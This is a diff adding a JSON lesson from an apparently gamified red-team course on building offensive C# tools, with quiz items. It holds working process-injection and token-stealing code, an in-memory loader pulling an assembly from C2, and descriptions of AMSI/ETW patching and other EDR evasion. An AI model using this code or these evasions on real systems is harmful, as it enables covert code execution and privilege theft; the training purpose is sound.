@@ -1,0 +1,226 @@
+{
+  "lesson_id": "80e0e20a-8f7e-4ba6-9721-8441d0b486d7",
+  "domain": "red_team",
+  "title": "Offensive Tool Development in C#",
+  "subtitle": "Building Custom .NET Offensive Tools for Red Team Operations",
+  "difficulty": 3,
+  "estimated_time": 55,
+  "order_index": 72,
+  "prerequisites": ["Custom C2 Development Fundamentals"],
+  "learning_objectives": [
+    "Understand the .NET ecosystem advantages for offensive tool development",
+    "Use P/Invoke and Win32 API calls from C# for system-level operations",
+    "Develop tools that evade common EDR detection mechanisms",
+    "Implement process injection and memory manipulation techniques in C#",
+    "Apply obfuscation and OPSEC considerations to offensive .NET tooling"
+  ],
+  "concepts": [
+    ".NET Ecosystem for Offensive Development",
+    "P/Invoke and Win32 API Integration",
+    "Process Injection Techniques in C#",
+    "EDR Evasion with .NET",
+    "Memory Manipulation and Token Handling",
+    "Obfuscation and OPSEC for .NET Tools",
+    "Tool Delivery and Execution Techniques"
+  ],
+  "content_blocks": [
+    {
+      "block_id": "block_1_mindset",
+      "type": "mindset_coach",
+      "title": "Why C# for Offensive Tool Development?",
+      "content": "C# and the .NET ecosystem are the red teamer's Swiss Army knife on Windows. Here's why:\n\n1. **Native Windows Integration**: .NET is built into Windows. No need to install runtimes or dependencies. Your tool runs natively.\n\n2. **Win32 API Access**: P/Invoke lets you call any Win32 API directly from C#. Process creation, memory manipulation, token handling — all accessible.\n\n3. **AMSI and EDR Blind Spots**: .NET assemblies loaded in-memory via Assembly.Load() bypass disk-based detection. The CLR handles execution, not the OS loader.\n\n4. **Rich Ecosystem**: System.IO, System.Diagnostics, System.Net — Windows APIs are first-class citizens in C#.\n\n5. **In-Memory Execution**: Reflective loading, inline C# execution (Cobalt Strike's execute-assembly), and PowerShell hosting all leverage .NET's in-memory capabilities.\n\nThe key insight: C# isn't 'better' than C or Rust — it's better for Windows red team operations because of its tight Windows integration and in-memory execution capabilities.",
+      "simplified_explanation": "C# is great for red team tools on Windows because it's built into Windows, can call any Windows API, runs in-memory (evading antivirus), and has rich libraries for system operations.",
+      "memory_aids": ["C# = native Windows integration", "P/Invoke = call any Win32 API", "In-memory = no disk = no AV scan", ".NET = red team's Swiss Army knife on Windows"],
+      "real_world_connection": "Tools like Rubeus, Seatbelt, SharpHound, and GhostPack are all C# tools. They dominate the red team landscape precisely because of the advantages listed above.",
+      "reflection_prompt": "Why would you choose C# over Python for a Windows-specific offensive tool?",
+      "is_interactive": false,
+      "xp_reward": 15
+    },
+    {
+      "block_id": "block_2_explanation",
+      "type": "explanation",
+      "title": "P/Invoke: Calling Win32 APIs from C#",
+      "content": "P/Invoke (Platform Invocation Services) is how C# calls native Windows DLLs. It's the bridge between managed .NET code and unmanaged Win32 APIs.\n\n**Basic P/Invoke pattern:**\n```csharp\nusing System;\nusing System.Runtime.InteropServices;\n\npublic class Win32API\n{\n    // 1. Declare the external function\n    [DllImport(\"kernel32.dll\", SetLastError = true)]\n    public static extern IntPtr OpenProcess(\n        uint dwDesiredAccess,\n        bool bInheritHandle,\n        int dwProcessId\n    );\n    \n    [DllImport(\"kernel32.dll\", SetLastError = true)]\n    public static extern bool CloseHandle(IntPtr hObject);\n}\n\n// 2. Use it like any C# method\nclass Program\n{\n    static void Main()\n    {\n        IntPtr hProcess = Win32API.OpenProcess(0x0010, false, 1234);\n        if (hProcess == IntPtr.Zero)\n        {\n            Console.WriteLine($\"OpenProcess failed: {Marshal.GetLastWin32Error()}\");\n            return;\n        }\n        \n        Console.WriteLine($\"Got handle: {hProcess}\");\n        Win32API.CloseHandle(hProcess);\n    }\n}\n```\n\n**Essential Win32 APIs for offensive development:**\n\n| API | Purpose | DLL |\n|---|---|---|\n| OpenProcess | Get a process handle | kernel32.dll |\n| VirtualAllocEx | Allocate memory in another process | kernel32.dll |\n| WriteProcessMemory | Write data to another process's memory | kernel32.dll |\n| CreateRemoteThread | Execute code in another process | kernel32.dll |\n| OpenProcessToken | Access a process's security token | advapi32.dll |\n| DuplicateTokenEx | Duplicate a security token | advapi32.dll |\n| CreateProcessWithTokenW | Launch process with stolen token | advapi32.dll |\n| VirtualProtect | Change memory protection | kernel32.dll |\n| GetProcAddress | Get function address from DLL | kernel32.dll |\n| LoadLibrary | Load a DLL into a process | kernel32.dll |\n\n**P/Invoke gotchas:**\n- Always set `SetLastError = true` to get error codes\n- Use `Marshal.GetLastWin32Error()` immediately after the call\n- C# `bool` (4 bytes) ≠ C++ `BOOL` (4 bytes) in some cases — use `[MarshalAs(UnmanagedType.Bool)]`\n- IntPtr (not int) for handles — handles are pointer-sized\n- Free handles with CloseHandle to avoid leaks",
+      "simplified_explanation": "P/Invoke lets C# call Windows system functions directly. You declare the function with DllImport, then call it like a regular C# method. It's how you access process creation, memory manipulation, and token handling from .NET.",
+      "memory_aids": ["DllImport = declare the external function", "SetLastError = true = get error codes", "IntPtr for handles, not int", "CloseHandle when done", "OpenProcess → VirtualAllocEx → WriteProcessMemory → CreateRemoteThread = classic injection"],
+      "real_world_connection": "Every major C# offensive tool uses P/Invoke. Rubeus calls LsaEnumerateLogons, Seatbelt calls various system APIs, and process injection tools call the exact APIs listed above.",
+      "reflection_prompt": "Why is P/Invoke important for red teaming rather than just using the .NET Framework classes?",
+      "is_interactive": false,
+      "xp_reward": 25
+    },
+    {
+      "block_id": "block_3_teach_me_10",
+      "type": "explanation",
+      "title": "Teach Me Like I'm 10: C# Offensive Tools",
+      "content": "Imagine you want to open a locked door in a building (a computer process). Normal C# gives you polite ways to knock on doors. P/Invoke gives you a master key that opens any door.\n\nHere's how it works:\n\n1. **Normal C#**: 'Hey .NET, can I start a program?' → .NET: 'Sure, here's Process.Start()'\n2. **P/Invoke C#**: 'Hey Windows, I need direct access to process memory' → Windows: 'Here's OpenProcess() — you can touch anything'\n\n**The master keys (Win32 APIs):**\n- OpenProcess = get access to a running program\n- VirtualAllocEx = claim space inside that program's memory\n- WriteProcessMemory = put your code in that space\n- CreateRemoteThread = tell the program to run your code\n\n**Why this matters for red team:**\nNormally, antivirus watches programs start from files on disk. But if you:\n1. Open a legitimate program (like explorer.exe)\n2. Claim some memory inside it\n3. Write your code into that memory\n4. Tell it to run\n\n...the antivirus sees a legitimate program running, not your code. That's process injection, and it's why C# + P/Invoke is so powerful for red teaming.\n\n**The defense side:** EDR tools have learned to watch for these patterns. They see OpenProcess + VirtualAllocEx + WriteProcessMemory + CreateRemoteThread and flag it. So red teamers have developed more sophisticated techniques — which we'll cover next.",
+      "simplified_explanation": "P/Invoke is like having a master key to Windows. You can open any program, put your code inside it, and tell it to run. Antivirus sees the legitimate program, not your code. It's sneaky but defenders are learning to spot it.",
+      "memory_aids": ["Normal C# = knock politely", "P/Invoke = master key", "Open → Allocate → Write → Execute = the pattern", "EDR watches for this pattern = need evasions"],
+      "real_world_connection": "This is exactly how Mimikatz works. It opens lsass.exe, allocates memory, injects code, and extracts credentials. Understanding this pattern is the foundation for both offense and defense.",
+      "reflection_prompt": "If you were a defender, what pattern would you watch for to detect this technique?",
+      "is_interactive": false,
+      "xp_reward": 15
+    },
+    {
+      "block_id": "block_4_code_exercise",
+      "type": "code_exercise",
+      "title": "Process Injection in C#",
+      "content": "Classic process injection using P/Invoke. This is the foundational technique that all advanced injection methods build upon:\n\n```csharp\nusing System;\nusing System.Diagnostics;\nusing System.Runtime.InteropServices;\n\npublic class ProcessInjection\n{\n    // P/Invoke declarations\n    [DllImport(\"kernel32.dll\", SetLastError = true)]\n    static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);\n\n    [DllImport(\"kernel32.dll\", SetLastError = true)]\n    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);\n\n    [DllImport(\"kernel32.dll\", SetLastError = true)]\n    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);\n\n    [DllImport(\"kernel32.dll\", SetLastError = true)]\n    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);\n\n    [DllImport(\"kernel32.dll\", SetLastError = true)]\n    static extern bool CloseHandle(IntPtr hObject);\n\n    // Constants\n    const uint PROCESS_ALL_ACCESS = 0x001F0FFF;\n    const uint MEM_COMMIT = 0x00001000;\n    const uint MEM_RESERVE = 0x00002000;\n    const uint PAGE_EXECUTE_READWRITE = 0x40;\n\n    public static bool Inject(int pid, byte[] shellcode)\n    {\n        // Step 1: Open target process\n        IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, pid);\n        if (hProcess == IntPtr.Zero)\n        {\n            Console.WriteLine($\"[-] OpenProcess failed: {Marshal.GetLastWin32Error()}\");\n            return false;\n        }\n        Console.WriteLine(\"[+] Got process handle\");\n\n        // Step 2: Allocate memory in target process\n        IntPtr remoteMemory = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n        if (remoteMemory == IntPtr.Zero)\n        {\n            Console.WriteLine($\"[-] VirtualAllocEx failed: {Marshal.GetLastWin32Error()}\");\n            CloseHandle(hProcess);\n            return false;\n        }\n        Console.WriteLine($\"[+] Allocated memory at 0x{remoteMemory.ToString(\"X\")}\");\n\n        // Step 3: Write shellcode to allocated memory\n        IntPtr bytesWritten;\n        if (!WriteProcessMemory(hProcess, remoteMemory, shellcode, (uint)shellcode.Length, out bytesWritten))\n        {\n            Console.WriteLine($\"[-] WriteProcessMemory failed: {Marshal.GetLastWin32Error()}\");\n            CloseHandle(hProcess);\n            return false;\n        }\n        Console.WriteLine($\"[+] Wrote {bytesWritten} bytes\");\n\n        // Step 4: Create remote thread to execute shellcode\n        IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, remoteMemory, IntPtr.Zero, 0, IntPtr.Zero);\n        if (hThread == IntPtr.Zero)\n        {\n            Console.WriteLine($\"[-] CreateRemoteThread failed: {Marshal.GetLastWin32Error()}\");\n            CloseHandle(hProcess);\n            return false;\n        }\n        Console.WriteLine(\"[+] Remote thread created — shellcode executing\");\n\n        // Cleanup\n        CloseHandle(hThread);\n        CloseHandle(hProcess);\n        return true;\n    }\n}\n```\n\n**Why this gets caught by EDR:**\n1. `PROCESS_ALL_ACCESS` on a foreign process is highly suspicious\n2. `VirtualAllocEx` with `PAGE_EXECUTE_READWRITE` (RWX) is a red flag\n3. `WriteProcessMemory` + `CreateRemoteThread` is the classic injection pattern\n4. EDR hooks these API calls and flags the behavior\n\n**Analysis questions:**\n1. Why is `PAGE_EXECUTE_READWRITE` suspicious? What's a more OPSEC-safe alternative?\n2. What's the detection signature for this exact sequence of API calls?\n3. How would you minimize the requested permissions in OpenProcess?\n4. Why is `PROCESS_ALL_ACCESS` unnecessary for this operation?",
+      "simplified_explanation": "This code opens a process, claims memory inside it, writes shellcode, and tells it to run. It works but every EDR detects it because it uses the most obvious API calls in the most suspicious way possible.",
+      "memory_aids": ["OpenProcess → VirtualAllocEx → WriteProcessMemory → CreateRemoteThread", "PROCESS_ALL_ACCESS = suspicious", "PAGE_EXECUTE_READWRITE = dead giveaway", "EDR hooks these API calls = detected"],
+      "real_world_connection": "This is the 'Hello World' of process injection. It works but gets caught by any modern EDR. More advanced techniques (DLL injection, process hollowing, APC injection) evolved specifically to evade the detection this pattern triggers.",
+      "reflection_prompt": "How would you modify this code to be less detectable? What's the minimum permission needed?",
+      "is_interactive": true,
+      "xp_reward": 30
+    },
+    {
+      "block_id": "block_5_real_world",
+      "type": "real_world",
+      "title": "Advanced Evasion Techniques for .NET Tools",
+      "content": "Modern EDR catches the classic injection pattern. Here's how red teamers adapt:\n\n**1. Direct Syscalls (bypassing API hooks)**\nEDR hooks Win32 API calls in ntdll.dll. Direct syscalls bypass these hooks by calling the kernel directly.\n```csharp\n// Instead of calling CreateRemoteThread (which EDR hooks)\n// Call NtCreateThreadEx directly via syscall\n// This bypasses user-mode API hooks\n```\n\n**2. Avoiding RWX Memory**\nInstead of allocating PAGE_EXECUTE_READWRITE, allocate PAGE_READWRITE, write the shellcode, then change protection to PAGE_EXECUTE_READ:\n```csharp\nIntPtr mem = VirtualAllocEx(hProcess, IntPtr.Zero, size, MEM_COMMIT, PAGE_READWRITE);\nWriteProcessMemory(hProcess, mem, shellcode, size, out _);\nVirtualProtectEx(hProcess, mem, size, PAGE_EXECUTE_READ, out _);\n// Now: readable+executable, not writable+executable at the same time\n```\n\n**3. Process Hollowing**\nCreate a legitimate process in suspended state, replace its memory with your code, then resume:\n```csharp\n// CreateProcess in suspended mode\n// Unmap the legitimate image\n// Write your code at the same base address\n// Resume the thread\n```\n\n**4. APC Injection**\nInstead of CreateRemoteThread, use QueueUserAPC to execute code in an existing thread:\n```csharp\n// Queue an APC to a thread in the target process\n// The APC runs when the thread enters an alertable state\n// No new thread created = less suspicious\n```\n\n**5. AMSI Bypass**\n.NET assemblies are scanned by AMSI (Anti-Malware Scan Interface) before execution. Bypassing AMSI allows your assemblies to load without being scanned:\n```csharp\n// Patch AMSI's AmsiScanBuffer to always return AMSI_RESULT_CLEAN\n// This prevents .NET assemblies from being scanned at load time\n```\n\n**6. ETW Patching**\nETW (Event Tracing for Windows) is how EDR collects telemetry. Patching EtwEventWrite prevents event collection:\n```csharp\n// Patch ntdll!EtwEventWrite to return STATUS_SUCCESS immediately\n// This blinds EDR telemetry collection\n```\n\n**OPSEC considerations for evasion:**\n- These techniques are for authorized red team engagements only\n- Document every evasion technique used in your report\n- Defense teams need to understand these to build detections\n- The goal is to test detection, not to evade it permanently\n- Always operate within your Rules of Engagement",
+      "simplified_explanation": "EDR watches for obvious patterns, so red teamers adapt: call the kernel directly instead of hooked APIs, avoid RWX memory, hollow out legitimate processes, use existing threads, and bypass the antivirus scanner.",
+      "memory_aids": ["Direct syscalls = bypass API hooks", "RW→RX = avoid simultaneous RWX", "Process hollowing = replace legitimate process", "APC injection = no new thread", "AMSI bypass = skip the scanner", "ETW patch = blind the telemetry"],
+      "real_world_connection": "Tools like Cobalt Strike, Brute Ratel, and Mythic all implement these evasion techniques. Understanding them is essential for both offense (testing) and defense (detecting).",
+      "reflection_prompt": "If you were a defender, which evasion technique would be hardest to detect? How would you build detection for it?",
+      "is_interactive": false,
+      "xp_reward": 25
+    },
+    {
+      "block_id": "block_6_memory_aid",
+      "type": "memory_aid",
+      "title": "C# Offensive Development Quick Reference",
+      "content": "**P/Invoke Pattern — 4 Steps**\n| Step | API | Purpose |\n|---|---|---|\n| Open | OpenProcess | Get handle to target |\n| Allocate | VirtualAllocEx | Claim memory in target |\n| Write | WriteProcessMemory | Inject shellcode |\n| Execute | CreateRemoteThread | Run shellcode |\n\n**Evasion Techniques — A.P.A.C.H.E.**\n- **A**MSI Bypass — Patch the scanner\n- **P**rocess Hollowing — Replace legitimate process\n- **A**PC Injection — Use existing threads\n- **C**all Direct Syscalls — Bypass API hooks\n- **H**ide Memory — RW→RX instead of RWX\n- **E**TW Patch — Blind telemetry\n\n**Essential Win32 APIs**\n- Process: OpenProcess, CreateProcess, TerminateProcess\n- Memory: VirtualAllocEx, WriteProcessMemory, VirtualProtectEx\n- Threads: CreateRemoteThread, QueueUserAPC\n- Tokens: OpenProcessToken, DuplicateTokenEx, CreateProcessWithTokenW\n- Modules: LoadLibrary, GetProcAddress\n\n**.NET OPSEC Tips**\n- Use Assembly.Load() for in-memory execution\n- Obfuscate strings and class names\n- Compile with /optimize and remove debugging info\n- Use signed assemblies when possible\n- Target legitimate processes (svchost, explorer)\n- Minimize API call sequences that match known patterns",
+      "simplified_explanation": "Remember APACHE for evasion techniques and the 4-step injection pattern (Open→Allocate→Write→Execute). These are the building blocks of C# offensive tooling.",
+      "memory_aids": ["Open→Allocate→Write→Execute = injection pattern", "APACHE = AMSI, Process Hollowing, APC, Call Direct Syscalls, Hide Memory, ETW", "Key APIs: OpenProcess, VirtualAllocEx, WriteProcessMemory, CreateRemoteThread"],
+      "real_world_connection": "Every C# red team tool uses some combination of these techniques. Understanding them is table stakes for both red and blue teams.",
+      "reflection_prompt": "Can you list all 6 APACHE evasion techniques from memory?",
+      "is_interactive": false,
+      "xp_reward": 10
+    },
+    {
+      "block_id": "block_7_reflection",
+      "type": "reflection",
+      "title": "Design a Red Team Tool",
+      "content": "**Scenario**: You're building a C# tool for an authorized red team engagement. The tool needs to:\n- Enumerate running processes\n- Inject into a specific target process\n- Execute a beacon payload\n- Avoid detection by CrowdStrike Falcon\n\n**Design decisions to make:**\n1. Which process will you target for injection? Why?\n2. What injection technique will you use? Justify your choice.\n3. How will you handle the payload (where does the shellcode come from)?\n4. What evasion techniques will you implement?\n5. How will you clean up after execution?\n6. What's your OPSEC plan for the compiled binary?\n\n**Consider:**\n- EDR hooking points and how to avoid them\n- Memory permissions that trigger behavioral detection\n- Network indicators from the injection\n- Log sources that will record your activity\n- What happens if your injection fails mid-execution\n\n**Ethical reminder**: This exercise is for authorized red team engagements only. Never use these techniques without explicit written authorization from the target organization.",
+      "simplified_explanation": "Design a complete injection tool: pick a target process, choose an injection method, plan your evasion, and think about cleanup. Consider how EDR will see each step.",
+      "memory_aids": ["Target process = legitimate, always-running", "Injection method = evade EDR hooks", "Payload delivery = encrypted, in-memory", "Evasion = APACHE techniques", "Cleanup = remove indicators", "OPSEC = obfuscate the binary"],
+      "real_world_connection": "This is the exact design process red team leads go through before every engagement. The tool design matters as much as the execution.",
+      "reflection_prompt": "What's the most OPSEC-safe injection technique? What trade-offs does it have?",
+      "is_interactive": true,
+      "xp_reward": 25
+    },
+    {
+      "block_id": "block_8_token_handling",
+      "type": "explanation",
+      "title": "Token Handling and Privilege Escalation in C#",
+      "content": "Access tokens are the core of Windows security. Understanding how to manipulate them is essential for privilege escalation and lateral movement.\n\n**What is an access token?**\nA data structure that contains the security context of a logged-on user — their SID, group memberships, privileges, and logon information. Every process has a token.\n\n**Token manipulation techniques:**\n\n```csharp\n// Steal a token from a running process\n[DllImport(\"advapi32.dll\", SetLastError = true)]\nstatic extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);\n\n[DllImport(\"advapi32.dll\", SetLastError = true)]\nstatic extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, int ImpersonationLevel, int TokenType, out IntPtr phNewToken);\n\n[DllImport(\"advapi32.dll\", SetLastError = true)]\nstatic extern bool CreateProcessWithTokenW(IntPtr hToken, uint dwLogonFlags, string lpApplicationName, string lpCommandLine, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);\n\n// Steal token from a high-privilege process\npublic static IntPtr StealToken(int pid)\n{\n    IntPtr hProcess = OpenProcess(0x0400, false, pid); // PROCESS_QUERY_INFORMATION\n    IntPtr hToken;\n    \n    if (!OpenProcessToken(hProcess, 0x0002, out hToken)) // TOKEN_DUPLICATE\n    {\n        Console.WriteLine($\"Failed to open token: {Marshal.GetLastWin32Error()}\");\n        return IntPtr.Zero;\n    }\n    \n    IntPtr hDupToken;\n    if (!DuplicateTokenEx(hToken, 0x000F003F, IntPtr.Zero, 2, 1, out hDupToken))\n    {\n        Console.WriteLine($\"Failed to duplicate token: {Marshal.GetLastWin32Error()}\");\n        CloseHandle(hToken);\n        return IntPtr.Zero;\n    }\n    \n    CloseHandle(hToken);\n    CloseHandle(hProcess);\n    return hDupToken;\n}\n```\n\n**Common token attack patterns:**\n1. **Token Stealing**: Find a high-privilege process, steal its token, create a new process with it\n2. **Make Token**: Use harvested credentials to create a logon token with LogonUser()\n3. **Pass-the-Hash**: Use NTLM hashes to authenticate without plaintext passwords\n4. **S4U**: Service-for-User — create a token for any user if you have a service account with delegation\n\n**OPSEC for token attacks:**\n- Prefer token stealing over make-token (fewer log entries)\n- Use CreateProcessWithTokenW over CreateProcessAsUserW (different log entries)\n- Clean up token handles after use\n- Avoid using DOMAIN ADMIN tokens unless necessary (creates obvious logs)",
+      "simplified_explanation": "Windows uses tokens (access tokens) to know what permissions a process has. If you steal a token from an admin process and use it to start your own process, your process runs as admin. It's like finding someone's ID badge and using it to get into restricted areas.",
+      "memory_aids": ["Token = security ID card for a process", "Steal token = copy someone else's ID badge", "CreateProcessWithTokenW = start a process with a stolen badge", "Make token = forge a new badge from credentials", "Clean up handles = destroy the evidence"],
+      "real_world_connection": "Rubeus performs token manipulation for Kerberos attacks. Incognito steals tokens for lateral movement. These are foundational Windows red team techniques.",
+      "reflection_prompt": "What's the OPSEC difference between stealing a token and making a new one? Which leaves fewer logs?",
+      "is_interactive": false,
+      "xp_reward": 25
+    },
+    {
+      "block_id": "block_9_obfuscation",
+      "type": "explanation",
+      "title": "Obfuscation and OPSEC for .NET Tools",
+      "content": "Writing the tool is half the battle. Getting it past EDR and blue team analysis is the other half.\n\n**String Obfuscation:**\nEDR and analysts search for suspicious strings in binaries. Obfuscate them:\n```csharp\n// Bad: Plaintext strings visible in binary\nstring command = \"cmd.exe /c whoami\";\nstring api = \"kernel32.dll\";\n\n// Better: Encoded strings\nbyte[] encoded = Convert.FromBase64String(\"Y21kLmV4ZSAvYyB3aG9hbWk=\");\nstring command = System.Text.Encoding.UTF8.GetString(encoded);\n\n// Best: Decrypt at runtime with a key\nstring command = Decrypt(encryptedBytes, key);\n```\n\n**Assembly Obfuscation Techniques:**\n- **ConfuserEx**: Free .NET obfuscator — renames symbols, encrypts strings, adds anti-tamper\n- **Dotfuscator**: Commercial obfuscator with control flow obfuscation\n- **Custom obfuscation**: XOR encoding, AES encryption, compression\n\n**In-Memory Execution:**\nThe most OPSEC-safe way to run .NET tools is in-memory, never touching disk:\n```csharp\n// Cobalt Strike's execute-assembly pattern\nbyte[] assemblyBytes = DownloadFromC2();\nAssembly asm = Assembly.Load(assemblyBytes);\nasm.EntryPoint.Invoke(null, new object[] { args });\n```\n\n**OPSEC Checklist for .NET Tools:**\n| Check | Why |\n|---|---|\n| Compile in Release mode | Removes debugging info |\n| Remove PDB files | Prevents symbol resolution |\n| Obfuscate strings | Prevents static analysis |\n| Rename classes/methods | Prevents signature detection |\n| Sign with a test certificate | Looks more legitimate |\n| Minimize API imports | Fewer hooks = fewer detections |\n| Use indirect API calls | Bypasses direct hooks |\n| Encrypt payloads | Prevents payload extraction |\n| Clean up memory | Zero out shellcode after execution |\n| Avoid common patterns | Don't look like known tools |\n\n**Delivery Techniques:**\n- **Assembly.Load**: Load .NET assemblies directly in memory\n- **PowerShell hosting**: Run C# via PowerShell with Add-Type\n- **MSBuild**: Execute C# via MSBuild task\n- **InstallUtil**: Execute C# via InstallUtil.exe\n- **WMI**: Remote execution via WMI event subscription\n\n**The golden rule**: If it touches disk, it can be detected. If it runs in memory, it's harder to catch but not impossible. Layer your OPSEC.",
+      "simplified_explanation": "Hide your strings, rename your methods, run in memory instead of disk, encrypt your payloads, and avoid patterns that EDR recognizes. No single technique makes you invisible — you need layers.",
+      "memory_aids": ["String obfuscation = hide text from static analysis", "In-memory execution = no disk = no AV scan", "ConfuserEx = free .NET obfuscator", "Delivery: Assembly.Load, PowerShell, MSBuild, InstallUtil", "If it touches disk, it can be detected"],
+      "real_world_connection": "Defenders analyze .NET tools with dnSpy, ILSpy, and de4dot. Obfuscation makes this analysis harder but not impossible. The best OPSEC is combining multiple techniques.",
+      "reflection_prompt": "What's more important: obfuscation or in-memory execution? Can you get away with one without the other?",
+      "is_interactive": false,
+      "xp_reward": 20
+    },
+    {
+      "block_id": "block_10_mindset",
+      "type": "mindset_coach",
+      "title": "The Red Team Developer Mindset",
+      "content": "Building offensive tools requires a different mindset than building defensive tools:\n\n**For offense:**\n- Think about detection at every line of code. 'Will this API call be flagged?' 'Is this string searchable?' 'Does this pattern match a known signature?'\n- Minimize your footprint. Every action creates evidence. Every log entry is a trail.\n- Design for failure. What happens if the injection fails? If the token is invalid? If EDR catches you? Have a clean exit path.\n\n**For defense (understanding the tools you build):**\n- Think about detection at every line of code. 'How would I detect this API call?' 'What string pattern would I search for?' 'What behavioral indicator would this create?'\n\nThese two perspectives are the same question, viewed from opposite sides. The best tool developers understand both.\n\n**Key principle: Build tools that test detection, not evade it permanently.**\n\nEvery evasion can be detected eventually. The goal of red team tooling is to test whether the blue team can detect your technique. If they can't, that's a gap to report. If they can, that's a detection working as designed.\n\n**Jim Kwik principle: Active Learning** — Don't just read about process injection. Build it. Compile it. Test it against an EDR. See what gets caught. Modify it. Test again. That cycle is how you develop real understanding.",
+      "simplified_explanation": "Build tools to test detection, not to evade it forever. Think about both sides: 'How would I catch this?' and 'How would I avoid detection?' The best red teamers understand the blue team perspective.",
+      "memory_aids": ["Think about detection at every line", "Minimize your footprint", "Design for failure — have an exit path", "Build to test detection, not to evade forever", "Understand both sides of the coin"],
+      "real_world_connection": "The best red team reports don't just say 'we evaded detection.' They say 'we tested detection capability X and found gap Y, which should be remediated by Z.'",
+      "reflection_prompt": "How would you explain to a blue team colleague why you're building offensive tools?",
+      "is_interactive": false,
+      "xp_reward": 10
+    }
+  ],
+  "pre_assessment": null,
+  "post_assessment": [
+    {
+      "question": "Why is C# advantageous for offensive tool development on Windows compared to other languages?",
+      "options": [
+        "C# is faster than C and Rust",
+        ".NET is built into Windows, supports P/Invoke for Win32 API access, and enables in-memory execution",
+        "C# has better networking libraries than Python",
+        "C# binaries are smaller than Go binaries"
+      ],
+      "correct_index": 1,
+      "explanation": "C#/.NET is advantageous because it's built into Windows (no runtime dependency), P/Invoke provides direct Win32 API access, and .NET assemblies can be loaded in-memory via Assembly.Load(), bypassing disk-based detection."
+    },
+    {
+      "question": "What is the purpose of P/Invoke in C# offensive tool development?",
+      "options": [
+        "To encrypt strings in the compiled binary",
+        "To call native Win32 API functions from managed .NET code",
+        "To bypass AMSI scanning",
+        "To decompile .NET assemblies"
+      ],
+      "correct_index": 1,
+      "explanation": "P/Invoke (Platform Invocation Services) enables C# code to call native Win32 API functions like OpenProcess, VirtualAllocEx, and CreateRemoteThread directly from managed .NET code."
+    },
+    {
+      "question": "What is the correct sequence of API calls for classic process injection?",
+      "options": [
+        "VirtualAllocEx → OpenProcess → CreateRemoteThread → WriteProcessMemory",
+        "CreateRemoteThread → WriteProcessMemory → VirtualAllocEx → OpenProcess",
+        "OpenProcess → VirtualAllocEx → WriteProcessMemory → CreateRemoteThread",
+        "WriteProcessMemory → OpenProcess → VirtualAllocEx → CreateRemoteThread"
+      ],
+      "correct_index": 2,
+      "explanation": "The classic injection sequence is: OpenProcess (get a handle), VirtualAllocEx (allocate memory in target), WriteProcessMemory (write shellcode), CreateRemoteThread (execute shellcode)."
+    },
+    {
+      "question": "Why is PAGE_EXECUTE_READWRITE (RWX) memory suspicious to EDR?",
+      "options": [
+        "It uses too much memory",
+        "Memory that is simultaneously writable and executable is a strong indicator of shellcode injection — legitimate programs rarely need RWX",
+        "RWX memory runs slower than PAGE_READWRITE",
+        "Windows doesn't support RWX memory"
+      ],
+      "correct_index": 1,
+      "explanation": "RWX (Read-Write-Execute) memory is suspicious because legitimate programs rarely need memory that can be both written to and executed. It's a strong indicator that shellcode is being injected. The OPSEC-safe approach is RW → RX (write, then change protection to executable)."
+    },
+    {
+      "question": "What does an AMSI bypass accomplish for a .NET offensive tool?",
+      "options": [
+        "It encrypts the .NET assembly so it can't be decompiled",
+        "It prevents the Anti-Malware Scan Interface from scanning .NET assemblies before they load in memory",
+        "It makes the tool run faster",
+        "It hides the tool from Windows Task Manager"
+      ],
+      "correct_index": 1,
+      "explanation": "AMSI (Anti-Malware Scan Interface) scans .NET assemblies before they load. An AMSI bypass patches AmsiScanBuffer to always return clean, preventing the scan and allowing malicious assemblies to load without being flagged."
+    }
+  ],
+  "mastery_threshold": 80,
+  "jim_kwik_principles": [
+    "teach_like_im_10",
+    "memory_hooks",
+    "connect_to_what_i_know",
+    "active_learning",
+    "meta_learning",
+    "minimum_effective_dose",
+    "reframe_limiting_beliefs",
+    "gamify_it",
+    "learning_sprint",
+    "multiple_memory_pathways"
+  ],
+  "base_xp_reward": 150,
+  "badge_unlock": null,
+  "is_core_concept": false,
+  "created_at": "2026-06-12T14:30:00",
+  "updated_at": "2026-06-12T14:30:00",
+  "author": "CyberLearn Advanced Curriculum Team",
+  "version": 2.0
+}
